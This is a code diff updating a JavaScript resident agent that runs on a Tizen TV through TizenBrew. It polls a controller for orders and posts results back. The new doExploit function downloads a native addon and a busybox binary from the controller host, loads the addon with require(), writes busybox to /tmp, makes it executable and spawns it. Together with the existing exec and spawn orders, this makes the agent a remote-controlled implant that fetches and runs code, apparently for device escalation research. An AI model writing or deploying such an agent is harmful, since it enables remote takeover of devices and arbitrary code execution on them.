@@ -1,4 +1,4 @@
-/* TV Recon v7 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v8 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -13,6 +13,7 @@ var fs = require('fs');
 var http = require('http');
 
 var lastModeStr = '';
+var executedNonces = {};
 var busy = false;
 
 function post(tag, data) {
@@ -31,8 +32,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v7 resident agent starting');
-post('v7-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v8 resident agent starting');
+post('v8-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -179,6 +180,79 @@ function doWritefile(mode) {
     } catch (e) { post('fetch-fail', String(e)); }
 }
 
+function doExploit(mode) {
+    /* Choreographed escalation train, one boot:
+     * 1. download N-API addon  2. require() it  3. read constructor marker
+     * 4. call probe()          5. download busybox  6. spawn busybox id (may kill)
+     */
+    if (busy) { post('exploit-busy', true); return; }
+    busy = true;
+    post('exploit-start', { step: 'fetch-addon' });
+    try {
+        var req = http.request('http://' + MAC + ':' + PORT + '/files/addon.node', function (res) {
+            var chunks = [];
+            res.on('data', function (c) { chunks.push(c); });
+            res.on('end', function () {
+                try {
+                    var buf = Buffer.concat(chunks);
+                    fs.writeFileSync('/tmp/x.node', buf);
+                    post('exploit-addon-saved', { bytes: buf.length });
+                    /* THE MOMENT: dlopen via require() */
+                    var addon = require('/tmp/x.node');
+                    post('exploit-addon-loaded', { typeOf: typeof addon, keys: T(function () { return Object.keys(addon); }) });
+                    /* constructor should have written the marker */
+                    var marker = read('/tmp/.nativenow', 2000);
+                    post('exploit-native-marker', marker);
+                    if (addon && addon.probe) {
+                        post('exploit-probe', T(function () { return String(addon.probe()); }));
+                    }
+                    /* step 2: busybox upload */
+                    var req2 = http.request('http://' + MAC + ':' + PORT + '/files/busybox', function (res2) {
+                        var chunks2 = [];
+                        res2.on('data', function (c) { chunks2.push(c); });
+                        res2.on('end', function () {
+                            try {
+                                var buf2 = Buffer.concat(chunks2);
+                                fs.writeFileSync('/tmp/bb', buf2);
+                                fs.chmodSync('/tmp/bb', 493);
+                                post('exploit-busybox-saved', { bytes: buf2.length });
+                                /* step 3: spawn test — the potentially lethal one, LAST */
+                                var cp = require('child_process');
+                                post('exploit-spawn-start', {});
+                                var child = cp.spawn('/tmp/bb', ['id'], { timeout: 15000 });
+                                var out = '', errS = '';
+                                child.stdout.on('data', function (d) { out += d.toString(); });
+                                child.stderr.on('data', function (d) { errS += d.toString(); });
+                                child.on('error', function (e) {
+                                    post('exploit-spawn-done', { err: String(e), code: e && e.code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
+                                    busy = false;
+                                });
+                                child.on('close', function (code) {
+                                    post('exploit-spawn-done', { code: code, out: out.slice(0, 2000), errS: errS.slice(0, 1000) });
+                                    busy = false;
+                                });
+                            } catch (e) {
+                                post('exploit-busybox-err', String(e));
+                                busy = false;
+                            }
+                        });
+                    });
+                    req2.on('error', function (e) { post('exploit-busybox-err', 'fetch: ' + String(e)); busy = false; });
+                    req2.end();
+                } catch (e) {
+                    post('exploit-addon-err', String(e));
+                    busy = false;
+                }
+            });
+        });
+        req.on('error', function (e) { post('exploit-addon-err', 'fetch: ' + String(e)); busy = false; });
+        req.end();
+    } catch (e) {
+        post('exploit-outer-err', String(e));
+        busy = false;
+    }
+}
+
 function tick() {
     try {
         getMode(function (mode) {
@@ -189,9 +263,19 @@ function tick() {
                     lastModeStr = ms;
                     post('mode', mode);
                 }
+                /* ONE-SHOT: every action carries a unique nonce; execute once. */
+                var nonce = mode.nonce || null;
+                if (nonce && executedNonces[nonce]) {
+                    if (mode.action !== 'exec' && mode.action !== 'spawn') {
+                        /* already ran this nonce — fall back to heartbeat only */
+                        return;
+                    }
+                }
+                if (nonce) executedNonces[nonce] = 1;
                 if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
                 else if (mode.action === 'writefile') doWritefile(mode);
+                else if (mode.action === 'exploit') doExploit(mode);
                 else if (mode.action === 'die') { post('dying', true); setTimeout(function () { throw new Error('UPDATE_RESTART'); }, 100); }
                 else if (mode.action === 'stop') { /* idle */ }
                 else doRecon(mode);
